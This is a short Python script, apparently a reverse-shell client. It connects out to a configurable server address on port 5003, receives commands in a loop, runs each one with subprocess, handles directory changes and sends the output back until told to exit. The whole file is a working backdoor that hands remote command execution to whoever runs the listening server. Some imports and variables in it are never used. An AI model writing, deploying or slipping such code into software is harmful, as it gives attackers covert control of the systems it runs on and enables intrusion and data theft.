import sys
import os
import socket
import subprocess
import paramiko


language = ""
mode = ""
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024


def main():
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))
    # message = s.recv(BUFFER_SIZE).decode()
    # print("Server:", message)
    while True:
        command = s.recv(BUFFER_SIZE).decode()
        if command.lower() == "exit":
            break
        if command.split()[0] == "cd":
            os.chdir(command.split()[1])
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()


if __name__ == "__main__":
    main()
